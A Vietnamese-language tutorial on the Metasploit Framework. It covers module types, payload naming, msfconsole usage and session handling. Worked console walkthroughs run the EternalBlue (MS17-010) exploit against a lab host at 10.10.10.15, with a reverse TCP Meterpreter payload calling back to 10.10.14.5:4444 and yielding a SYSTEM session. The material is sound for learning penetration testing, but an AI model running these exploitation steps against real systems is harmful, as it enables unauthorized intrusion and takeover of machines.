# Metasploit

[Tools](../README.md)

**Metasploit Framework** là exploitation framework mã nguồn mở phổ biến nhất trong giới pentest — gom exploit, payload, encoder và một mớ công cụ auxiliary vào chung một hệ sinh thái, giúp rút ngắn khoảng cách từ lúc tìm ra lỗ hổng đến lúc khai thác được thật sự.

---

## Chuỗi khai thác: lỗ hổng, exploit, payload

Trước khi mở `msfconsole` lên gõ lệnh, có ba khái niệm cần nắm chắc, vì gần như toàn bộ cách Metasploit tổ chức module xoay quanh ba thứ này.

Ví dụ dễ hình dung nhất là an ninh vật lý: lỗ hổng bảo mật giống một ổ khóa hỏng trên cửa kho. Exploit là hành động kéo cửa đó bật ra. Còn payload là thứ kẻ đột nhập làm sau khi đã lọt vào trong — trộm hàng, gắn thiết bị nghe lén, hoặc chỉ đơn giản chụp một tấm ảnh để chứng minh là đột nhập được.

Nói theo kiểu kỹ thuật hơn:

- **Lỗ hổng bảo mật (vulnerability)** là lỗi thiết kế, lập trình hoặc cấu hình trong hệ thống mục tiêu. Bản thân lỗi đó chưa gây hại gì cả, nó chỉ mở ra cơ hội — có thể là thực thi mã tùy ý, đọc file không có quyền, hay bỏ qua luôn bước xác thực.
- **Exploit** là đoạn mã lợi dụng đúng lỗ hổng đó. Nó là cơ chế tấn công, nhắm vào điểm yếu và kích hoạt theo cách có kiểm soát.
- **Payload** là đoạn mã chạy trên máy mục tiêu sau khi exploit đã thành công. Exploit mở cửa, payload là thứ đi qua cửa đó — mở reverse shell về máy mình, tạo user mới, hay chạy một lệnh bất kỳ.

Ba bước này gần như là nền tảng của mọi thứ Metasploit làm. Có exploit mà không có payload thì kích hoạt được lỗ hổng nhưng chẳng để làm gì. Có payload mà không có exploit thì chẳng có đường nào chạm tới mục tiêu. Nói cho cùng, kiến trúc của Metasploit là một bài toán ghép cặp: chọn đúng exploit, gắn đúng payload, nhắm đúng lỗ hổng.

---

## Kiến trúc module

Metasploit chia thư viện của nó thành bảy loại module, mỗi loại làm một việc riêng trong quy trình pentest. Phân biệt được bảy loại này là bước đầu tiên để không bị ngợp giữa hàng ngàn module có sẵn.

| Loại module | Vai trò |
|---|---|
| `exploit` | Nhắm vào một lỗ hổng cụ thể trên một nền tảng cụ thể, phân theo OS/dịch vụ (`exploits/windows/smb/`, `exploits/linux/http/`). Đây là danh mục lớn nhất, hơn 2.600 module. Nghe ai nói "dùng module Metasploit" thì gần như chắc chắn họ đang nói tới một exploit. |
| `auxiliary` | Mọi thứ không phải khai thác trực tiếp: quét cổng, nhận diện dịch vụ, brute-force login, fuzzing, phân tích mạng. Trinh sát và dò credential thường bắt đầu từ đây, trước khi đụng đến lỗ hổng. |
| `payload` | Mã chạy trên mục tiêu sau khi exploit ăn. Gần 1.700 module, trải dài nhiều OS, kiến trúc, phương thức kết nối. |
| `post` | Chạy sau khi đã có session trên mục tiêu — dump password hash, liệt kê thông tin hệ thống, chụp màn hình, pivot sang mạng khác. Sắp theo OS mục tiêu (`post/windows/gather/`, `post/linux/manage/`). |
| `encoder` | Biến đổi payload sang định dạng khác. Cái nổi tiếng nhất là `x86/shikata_ga_nai`, dùng XOR đa hình. Cần nói thẳng: encoder không phải mã hóa bảo mật, và tự nó không phải kỹ thuật né AV đáng tin — EDR hiện đại không chỉ so khớp chữ ký đơn giản kiểu đó. Encoder vẫn có việc hợp lệ để làm (bỏ bad character khỏi shellcode), nhưng coi nó như một cách ẩn nấp là hiểu nhầm khá phổ biến của người mới. |
| `nop` | Sinh chuỗi lệnh NOP — lệnh không làm gì cả. Trên x86, NOP kinh điển là `0x90`, báo CPU bỏ qua và nhảy sang lệnh kế. "NOP sled" đóng vai trò lớp đệm để payload rơi đúng vào địa chỉ bộ nhớ dự đoán được khi khai thác buffer overflow. Metasploit tự sinh cái này khi cần, nên thực tế ít khi phải đụng tay vào module loại này. |
| `evasion` | Nỗ lực vượt qua các cơ chế bảo vệ cụ thể như Windows Defender hay AppLocker. Khác encoder ở chỗ nó dùng kỹ thuật né tránh thật sự — process herpaderping, binary abuse... Danh mục nhỏ nhất, chỉ khoảng chục module, hiệu quả thì tùy môi trường mục tiêu đang cấu hình bảo mật ra sao.

### Ba dạng payload: single, stager, stage

Trong nhóm `payload`, Metasploit còn chia làm ba kiểu nữa:

Single (hay inline) là payload tự chứa hoàn toàn, gửi trong một gói duy nhất — thêm user, chạy lệnh hệ thống, mở bind shell đều làm được. Vì gói gọn hết trong một lần gửi nên single thường nặng hơn nhưng ăn chắc hơn, không có bước tải thứ hai để mà lỗi hay bị chặn.

Stager là payload nhỏ, nhẹ, chỉ làm đúng một việc: bắt kênh liên lạc giữa mình và target. Kết nối xong nó tải tiếp phần còn lại — gọi là stage. Ghép stager với stage lại thành một staged payload. Được cái nhẹ lúc gửi đầu, mất cái phải giữ kết nối ổn định đủ lâu để tải xong.

Cách phân biệt hai loại này nằm ngay trong đường dẫn payload — để ý dấu phân cách giữa loại shell và phương thức kết nối:

```
windows/x64/shell_reverse_tcp     -> dấu "_" giữa shell và reverse -> single, gói gọn trong một lần gửi
windows/x64/shell/reverse_tcp     -> dấu "/" giữa shell và reverse -> staged, gói nhỏ kết nối trước rồi tải phần còn lại
```

Quy tắc này áp dụng xuyên suốt cả framework, nhìn đường dẫn là đoán được ngay loại payload. Cấu trúc chung:

```
<platform>/<architecture>/<payload_type><separator><connection_method>
```

Ví dụ `linux/x86/meterpreter/reverse_tcp` là staged Meterpreter payload cho Linux 32-bit (dấu `/` giữa `meterpreter` và `reverse_tcp` xác nhận là staged). Bản single tương ứng sẽ là `linux/x86/meterpreter_reverse_tcp` — thay `/` bằng `_` thôi.

---

## Làm quen với msfconsole

`msfconsole` là giao diện dòng lệnh chính của Metasploit. Nó có search tích hợp, tab-completion, trợ giúp theo ngữ cảnh, thậm chí chạy được luôn một số lệnh Linux — tất cả để đỡ phải nhớ hàng nghìn tên module.

### Khởi động

Trên Kali (hay bất kỳ distro nào cài Metasploit), gõ:

```
msfconsole
```

Đợi một lúc, một banner ASCII art random hiện ra kèm version framework và số module theo từng loại:

```
Metasploit tip: Use the 'favorite' command to mark
frequently used modules

 =[ metasploit v6.4.x                          ]
+ -- --=[ 2607 exploits - 1325 auxiliary - 435 post       ]
+ -- --=[ 1710 payloads - 49 encoders - 14 nops          ]
+ -- --=[ 12 evasion                                      ]

msf6 >
```

Banner chỉ để trang trí thôi, đổi ngẫu nhiên mỗi lần mở, nhưng số module thì thật — con số cụ thể sẽ khác tùy lần cập nhật framework gần nhất.

Dấu nhắc lúc này đổi từ terminal bình thường sang `msf6 >`. Từ đây mọi lệnh gõ vào đều do `msfconsole` diễn giải, không còn là shell hệ thống nữa.

> Tiền tố `msf6` là version chính của framework. Bản cũ hơn có thể hiện `msf5`, nhưng lệnh và khái niệm trong bài này dùng được cho cả hai.

### Chạy lệnh hệ thống ngay trong console

Cái hay là `msfconsole` hỗ trợ luôn phần lớn lệnh Linux, không cần thoát ra ngoài mỗi lần muốn kiểm tra IP hay đọc file:

```
msf6 > whoami
[*] exec: whoami
root

msf6 > ip -br a show eth0
[*] exec: ip -br a show eth0
eth0             UP             10.10.14.5/24 fe80::3:35ff:fed5:91ed/64
```

Nó chuyển các lệnh này xuống shell bên dưới để chạy — tiện nhất là lúc cần xác nhận nhanh IP tấn công (`LHOST`) mà không muốn rời console giữa chừng.

Nhưng đừng mong nó hỗ trợ hết mọi tính năng shell. Redirect output chẳng hạn, không ăn:

```
msf6 > help > output.txt
[-] No such command
```

Muốn ghi output ra file thì dùng lệnh `spool` (ghi toàn bộ output console vào file), hoặc đơn giản là thoát ra làm ở terminal thường.

### Trợ giúp, lịch sử, tab-completion

Gõ `help` là ra danh sách toàn bộ lệnh `msfconsole` hỗ trợ. Kèm theo tên lệnh cụ thể thì xem được cách dùng chi tiết luôn:

```
msf6 > help search
Usage: search [<options>] [<keywords>:<values>]

Prepend a value with '-' to exclude any matching results.
If no options or keywords are provided, cached results are shown.

OPTIONS:
    -h, --help                      Help banner
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-reverse <column>     Reverse sort results by the specified column
    -s, --sort-column <column>      Sort results by the specified column
    -S, --filter <filter>           Regex filter
    -u, --use                       Use module if a single result is found

Keywords:
    aka         :  Modules with a matching AKA (also-known-as) name
    author      :  Modules written by this author
    arch        :  Modules affecting this architecture
    check       :  Modules that support the 'check' method
    CVE         :  Modules with a matching CVE ID
    edb         :  Modules with a matching Exploit-DB ID
    fullname    :  Modules with a matching full name
    name        :  Modules with a matching descriptive name
    platform    :  Modules affecting this platform
    ref         :  Modules with a matching ref
    target      :  Modules with a matching target
    type        :  Modules of a specific type (exploit, auxiliary, post, payload, nop, encoder, evasion)

Examples:
    search cve:2009 type:exploit
    search cve:2024 platform:windows type:exploit
    search name:smb type:auxiliary
```

Cái này dùng lại suốt: chưa chắc cú pháp hay tham số một lệnh nào đó, gõ `help <command>` là ra ngay, khỏi cần rời console đi tra tài liệu.

`msfconsole` cũng giữ lại lịch sử mọi lệnh đã gõ trong phiên làm việc, xem bằng `history`:

```
msf6 > history
  1  search type:exploit platform:windows smb
  2  use exploit/windows/smb/ms17_010_eternalblue
  3  show options
  4  set RHOSTS 10.10.10.15
  5  run
  6  back
  7  search type:auxiliary ssh
```

Dùng phím mũi tên lên/xuống để lướt lại lệnh cũ cũng được, y như terminal Linux bình thường.

Còn tab-completion thì chắc là tính năng mình dùng nhiều nhất — áp dụng cho cả tên lệnh, đường dẫn module, tên tham số. Gõ `use exploit/windows/smb/ms17` rồi nhấn Tab, console tự hoàn tất hoặc gợi ý các lựa chọn khớp. Đỡ gõ nhọc, nhất là mấy đường dẫn module lồng sâu mấy tầng.

### Năm loại dấu nhắc cần phân biệt

Làm việc với Metasploit sẽ đụng phải năm dấu nhắc khác nhau, mỗi cái báo hiệu đang đứng "ở đâu" và gõ được lệnh gì:

| Dấu nhắc | Ngữ cảnh | Gõ được gì |
|---|---|---|
| `user@host:~#` | Terminal Linux thường | Chỉ lệnh Linux chuẩn, Metasploit chưa chạy. |
| `msf6 >` | msfconsole, chưa chọn module | Lệnh toàn cục: `search`, `use`, `sessions`, `setg`. Chưa chạy được `exploit` hay set tham số riêng của module. |
| `msf6 exploit(windows/smb/ms17_010_eternalblue) >` | Đang trong ngữ cảnh module | Lệnh đầy đủ: `set`, `show options`, `exploit`, `run`, `check`, `back`. Dấu nhắc luôn hiện tên module đang tải. |
| `meterpreter >` | Session Meterpreter đang mở | Lệnh Meterpreter: `sysinfo`, `getuid`, `hashdump`, `shell`, `background`. Đang tương tác trực tiếp với máy mục tiêu. |
| `C:\Windows\system32>` | Shell OS trên target | Lệnh OS bình thường, nhưng chạy trên máy mục tiêu chứ không phải máy mình. |

Lệnh nào không chạy được, việc đầu tiên nên kiểm tra là đang đứng ở dấu nhắc nào. Lỗi hay gặp ở người mới: gõ `set RHOSTS` ngay từ `msf6 >` (chưa vào ngữ cảnh module nào cả), hoặc gõ lệnh Linux giữa lúc đang ở trong session Meterpreter.

---

## Tìm kiếm và kiểm tra module

Framework có hơn 6.100 module, nên tìm đúng cái cần dùng gần như là kỹ năng sống còn.

### search cơ bản và có bộ lọc

Đơn giản nhất là `search` kèm một từ khóa, Metasploit trả về mọi module có tên, mô tả hoặc reference khớp:

```
msf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   ...
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

Cột `#` dùng thay cho gõ full path (`use 0` hay `info 0` đều được). `Name` là đường dẫn đầy đủ, cho biết loại module, nền tảng, danh mục dịch vụ và tên cụ thể. `Disclosure Date` là ngày lỗ hổng công bố, thường trống với module auxiliary. `Rank` nói về độ tin cậy — nói kỹ hơn ở phần dưới. `Check` cho biết module hỗ trợ kiểm tra không phá hủy hay chỉ xác minh được bằng cách chạy thật.

Tìm chính xác hơn thì kết hợp từ khóa với filter. Mấy filter dùng nhiều nhất là `type` (lọc theo loại module), `platform` (lọc theo OS mục tiêu), `cve` (tìm theo mã CVE), và `name` (khớp tên mô tả).

Ví dụ tìm module quét SMB loại auxiliary:

```
msf6 > search type:auxiliary name:smb

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank    Check  Description
   -   ----                                                        ---------------  ----    -----  -----------
   0   auxiliary/server/capture/smb                                .                normal  No     Authentication Capture: SMB
   1   auxiliary/server/relay/esc8                                 .                normal  No     ESC8 Relay: SMB to HTTP(S)
   2   auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   7   auxiliary/scanner/smb/smb_ms17_010                          .                normal  No     MS17-010 SMB RCE Detection
```

Thêm dấu `-` trước filter để loại trừ — `search type:exploit -platform:windows` trả về mọi exploit không nhắm Windows chẳng hạn.

### Bảng xếp hạng độ tin cậy (rank)

Cột Rank nói lên mức độ đáng tin của một exploit. Metasploit chia bảy bậc:

| Rank | Ý nghĩa |
|---|---|
| **Excellent** | Không bao giờ làm sập dịch vụ mục tiêu — thường là SQL injection, command injection, file inclusion, những kiểu vốn dĩ đã an toàn để khai thác. |
| **Great** | Có target mặc định tự dò đúng cấu hình (ví dụ địa chỉ return), chạy ổn trên nhiều cấu hình phổ biến. |
| **Good** | Target mặc định bao phủ trường hợp phổ biến nhất, nhưng không tự dò. |
| **Normal** | Chạy ổn với một version cụ thể của mục tiêu, nhưng không tự dò hay có default áp dụng rộng. |
| **Average** | Nhìn chung không ổn định lắm, nhưng tỷ lệ ăn vẫn trên 50%. |
| **Low** | Tỷ lệ ăn dưới 50%. |
| **Manual** | Về cơ bản gây DoS hoặc cần cấu hình tay khá nhiều — tỷ lệ ăn chỉ tầm 15% trở xuống. |

Rank cao không có nghĩa chắc ăn, rank thấp cũng không có nghĩa chắc trượt. Cấu hình mục tiêu, điều kiện mạng, và mấy lớp bảo vệ đang chạy đều can thiệp vào. Coi rank như một gợi ý ban đầu thôi, đừng đặt cược hết vào đó.

### info — đọc kỹ trước khi dùng

Tìm được module có vẻ hợp, chạy `info` để xem chi tiết — bằng full path hoặc số thứ tự từ kết quả search:

```
msf6 > info exploit/windows/smb/ms17_010_eternalblue

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch:
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  thelightcosine

Available targets:
  Id  Name
  --  ----
  =>  0   Automatic Target

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s)
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain to use for authentication
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit,
  part of the FuzzBunch toolkit released by Shadow Brokers. [...]

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
```

Chừng đó là đủ để quyết định module có hợp với tình huống hay không: nền tảng, tham số bắt buộc, độ tin cậy, cách lỗ hổng hoạt động, và CVE liên quan. Đây không phải menu trợ giúp, mà là bản tóm tắt kỹ thuật thật sự của module.

Để ý ba chỗ này: `Privileged` là `Yes` thì khai thác ăn cho quyền cao luôn (SYSTEM/root), còn `No` thì chỉ có quyền của dịch vụ bị khai thác thôi. `Check supported` là `Yes` thì xác minh được mục tiêu có dính lỗ hổng mà không cần gửi payload thật — an toàn hơn nhiều khi đụng vào môi trường production, chỗ mà làm sập dịch vụ là không được phép. Còn `Available targets` là mấy cấu hình target mà module hỗ trợ — mặc định (`Automatic Target`) thường đủ dùng rồi, nhưng thỉnh thoảng vẫn phải chọn tay (ví dụ một service pack Windows cụ thể) bằng `set TARGET <id>`.

---

## Cấu hình và chạy một module

Tìm được module, đọc `info` xong, xác định nó hợp. Giờ tới lượt báo cho Metasploit biết nhắm vào đâu, kết nối ngược về đâu, và cần cấp cái gì.

### use — chọn module

`use` nạp module vào ngữ cảnh hiện tại, dùng full path hoặc số thứ tự từ kết quả search đều được:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Dấu nhắc đổi để phản ánh module vừa nạp, và Metasploit tự chọn sẵn payload mặc định. Ghi đè sau bằng `set PAYLOAD` cũng được, nhưng với nhiều lỗ hổng phổ biến thì mặc định vốn đã ổn rồi.

Một chỗ hay bị hiểu nhầm: nạp module không phải là "vào" một thư mục nào cả. Vẫn đang ở cùng phiên `msfconsole`, chỉ là ngữ cảnh cho Metasploit biết tham số và lệnh nào áp dụng cho module nào thôi. Thử gõ `whoami` ngay trong ngữ cảnh module là thấy vẫn chạy bình thường.

Muốn thoát ngữ cảnh module, quay về `msf6 >`, dùng `back`:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```

### show options — đọc tham số

Nạp module xong, `show options` liệt kê mọi tham số cấu hình được:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Output chia ba phần. Module options là tham số riêng của exploit — `RHOSTS` (IP mục tiêu) để trống và `Required: yes`, nghĩa là chưa điền thì module không chạy đâu. `RPORT` điền sẵn `445` (cổng SMB mặc định), chỉ cần đổi nếu target chạy SMB ở cổng khác.

Payload options là tham số của payload đã chọn. `LHOST` (IP máy mình) và `LPORT` (cổng nghe kết nối ngược) là hai cái hay set nhất — Metasploit thường tự nhận diện `LHOST` từ interface mạng đang chạy, nhưng vẫn nên kiểm tra lại, nhất là lúc đi qua VPN thì hay bị sai.

Exploit target là cấu hình phần mềm mà exploit nhắm tới. Đa số module hiện đại dùng `Automatic Target` tự dò, module cũ hơn thì đôi khi phải chọn tay qua `set TARGET <id>`.

Cột `Required` chính là checklist: cái nào đánh dấu `yes` thì bắt buộc phải có giá trị, `no` thì tùy.

### Các tham số cốt lõi cần nhớ

Mỗi module có bộ tham số riêng, nhưng sáu cái sau gặp hoài, nên thuộc lòng luôn cho nhanh:

| Tham số | Ý nghĩa |
|---|---|
| `RHOSTS` | IP mục tiêu. Nhận một IP đơn (`10.10.10.15`), dải CIDR (`10.10.10.0/24`), dải gạch ngang (`10.10.10.1-10.10.10.50`), hoặc file danh sách (`file:/path/to/targets.txt`). |
| `RPORT` | Cổng trên máy mục tiêu, nơi dịch vụ dính lỗ hổng đang chạy. Thường điền sẵn cổng mặc định của dịch vụ. |
| `LHOST` | IP máy mình. Là nơi mục tiêu kết nối ngược về với reverse payload. |
| `LPORT` | Cổng trên máy mình nhận kết nối ngược. Mặc định `4444`, đổi sang cổng trống nào cũng được. |
| `PAYLOAD` | Payload gửi kèm exploit. Thường có sẵn giá trị mặc định. |
| `SESSION` | Dùng với module post-exploitation, chỉ định session nào để chạy module lên. |

### set / unset — gán giá trị

`set` gán giá trị cho tham số trong ngữ cảnh module hiện tại:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 5555
LPORT => 5555
```

Set xong nên chạy lại `show options` để nhìn lại cho chắc. Gõ sai `RHOSTS` hay lộn `LHOST` là một trong những lý do phổ biến nhất khiến khai thác im lặng thất bại mà không hiểu vì sao.

Xóa một tham số bằng `unset`:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset RHOSTS
Unsetting RHOSTS...
```

Reset hết về mặc định thì `unset all`:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
```

### set vs setg — cục bộ và toàn cục

Tham số set bằng `set` chỉ sống trong module hiện tại. Chuyển sang module khác là mất, phải set lại từ đầu.

`setg` thì set một giá trị toàn cục, giữ nguyên xuyên suốt mọi module trong cả phiên `msfconsole`. Tiện khi làm việc với cùng một mục tiêu mà phải đi qua nhiều module.

Ví dụ muốn quét MS17-010 bằng module auxiliary rồi mới khai thác. Không có `setg` thì phải set `RHOSTS` hai lần:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_ARCH   true             no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true             no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false            no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  [...]            yes       List of named pipes to check
   RHOSTS       10.10.10.15      yes       The target host(s)
   RPORT        445              yes       The SMB service port (TCP)
```

`RHOSTS` tự điền sẵn trong module quét dù được set từ ngữ cảnh exploit trước đó — `setg` hoạt động đúng kiểu vậy, giá trị theo suốt mọi module cho tới khi thoát `msfconsole` hoặc xóa bằng `unsetg`:

```
msf6 > unsetg RHOSTS
Unsetting RHOSTS...
```

Kinh nghiệm mình hay dùng: `setg` cho giá trị không đổi suốt buổi (`RHOSTS`, `LHOST`), `set` cho cái riêng của từng module (`RPORT`, `PAYLOAD`, `SESSION`).

### show payloads / set PAYLOAD — đổi payload

Metasploit tự gán payload mặc định lúc nạp exploit. Xem hết payload tương thích với module hiện tại bằng `show payloads`:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                                Rank    Check  Description
   -   ----                                                ----    -----  -----------
   0   generic/custom                                      manual  No     Custom Payload
   1   generic/shell_bind_tcp                              manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                           manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                    manual  No     Windows x64 Execute Command
   4   windows/x64/meterpreter/bind_tcp                    manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager
   5   windows/x64/meterpreter/reverse_tcp                 manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
   6   windows/x64/meterpreter_reverse_tcp                 manual  No     Windows Meterpreter Shell, Reverse TCP Inline
   7   windows/x64/shell/reverse_tcp                       manual  No     Windows x64 Command Shell, Reverse TCP Stager
```

Chỉ payload tương thích kiến trúc và nền tảng của exploit mới hiện ra thôi. Đổi payload bằng `set PAYLOAD`, kèm tên hoặc số thứ tự:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
```

Lệnh này đổi Meterpreter mặc định thành command shell thường. Lúc nào nên đổi payload thì để dành cho một bài riêng nói kỹ hơn.

### exploit/run và check — chạy thật hay dò trước

Set xong hết tham số bắt buộc, khởi chạy bằng `exploit` (hay `run` cũng được, hai cái như nhau):

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.15:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.15:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.10.10.15:445 - Connecting to target for exploitation.
[+] 10.10.10.15:445 - Connection established for exploitation.
[+] 10.10.10.15:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.15:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.15:445 - Sending all but last fragment of exploit packet
[*] Sending stage (201283 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.15:49186)

meterpreter >
```

Diễn ra đúng theo thứ tự: Metasploit bật listener trên máy mình để bắt kết nối ngược, chạy nhanh một lượt kiểm tra lỗ hổng trước khi gửi exploit thật, rồi kết nối tới dịch vụ SMB của mục tiêu, kích hoạt buffer overflow, gửi payload. Payload (Meterpreter) chạy trên máy mục tiêu, kết nối ngược về listener, và dấu nhắc đổi thành `meterpreter >` — lúc này đang tương tác trực tiếp với hệ thống mục tiêu rồi.

`run` sinh ra vì gõ `exploit` cảm thấy hơi kỳ khi đang chạy một module không phải exploit, kiểu scanner hay brute-forcer. Nhiều người dùng `run` cho auxiliary và `exploit` cho khai thác cho hợp ngữ cảnh, nhưng thực ra hai lệnh làm y hệt nhau ở mọi nơi.

Thêm flag `-z` vào `exploit` để chạy xong đẩy session vào nền luôn, quay lại dấu nhắc module thay vì rơi thẳng vào Meterpreter:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
[...]
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.15:49186)
[*] Session 1 created in the background.
```

Hữu ích lúc muốn khai thác xong là chạy tiếp module khác lên host khác ngay, không mất công quay lại.

Một số module hỗ trợ `check` — dò xem mục tiêu có dính lỗ hổng hay không mà chưa cần gửi payload:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
[*] 10.10.10.15:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.15:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.10.10.15:445 - Scanned 1 of 1 hosts (100% complete)
```

Không phải module nào cũng có `check` (nhớ lại cột Check lúc search). Có thì nên chạy trước khi `exploit`, nhất là trên production — lỡ khai thác thất bại một lần có thể làm sập dịch vụ hoặc dính cảnh báo ngay.

---

## Quản lý phiên (sessions)

Một buổi pentest thật hiếm khi chỉ đụng một mục tiêu. Phạm vi có khi là hàng chục máy trên vài mạng con, mở nhiều session cùng lúc — cái thì khai thác trực tiếp, cái thì pivot từ máy đã chiếm được. Không theo dõi được session nào nối tới máy nào, hoặc quên đẩy session vào nền trước khi đánh máy tiếp theo, là cách nhanh nhất để mất công và tự báo động cho phía phòng thủ.

### Session là gì?

Session là kênh liên lạc đang mở giữa máy mình và máy mục tiêu đã bị khai thác. Exploit thành công, payload chạy, nó kết nối ngược về (hoặc chấp nhận kết nối từ) máy mình — kết nối đó được đăng ký thành session với một ID số riêng.

Có ba loại hay gặp. Meterpreter là môi trường tương tác đầy đủ nhất, có sẵn lệnh cho filesystem, leo quyền, pivot — phổ biến và mạnh nhất trong ba loại. Shell là giao diện dòng lệnh OS cơ bản (`cmd.exe` trên Windows, `/bin/sh` trên Linux), đơn giản hơn nhưng ít tính năng. Protocol-specific (mới hơn, từ Metasploit 6.4) thì truy cập tương tác vào dịch vụ như SMB, MSSQL, MySQL, PostgreSQL — chuyên để liệt kê thông tin dịch vụ chứ không phải truy cập chung.

Dù là loại nào thì lệnh quản lý cũng giống nhau hết.

### background — chạy nền

Đang trong session (thấy dấu nhắc `meterpreter >` hay shell của máy mục tiêu), quay về `msfconsole` mà không cần đóng session — gọi là chạy nền:

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Session vẫn sống, chỉ là tiêu điểm chuyển về `msfconsole` thôi. Kết nối tới mục tiêu vẫn mở ngầm, quay lại lúc nào cũng được.

Cái này gần như bắt buộc khi làm nhiều mục tiêu cùng lúc. Không chạy nền thì phải đóng session hiện tại mới nạp và chạy được module khác — mất quyền truy cập ngay lập tức. Chạy nền thì giữ được nhiều kết nối song song trong khi vẫn làm việc tiếp trên `msfconsole`.

### sessions — liệt kê

`sessions` không kèm gì cả sẽ liệt kê toàn bộ session đang mở, chạy từ `msf6 >` hay từ trong ngữ cảnh module nào cũng được:

```
msf6 > sessions

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.10.14.5:4444 ->
            ows                    WIN-TARGET01           10.10.10.15:49159
                                                          (10.10.10.15)
  2         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.10.14.5:4445 ->
            ows                    WIN-TARGET01           10.10.10.15:49161
                                                          (10.10.10.15)
```

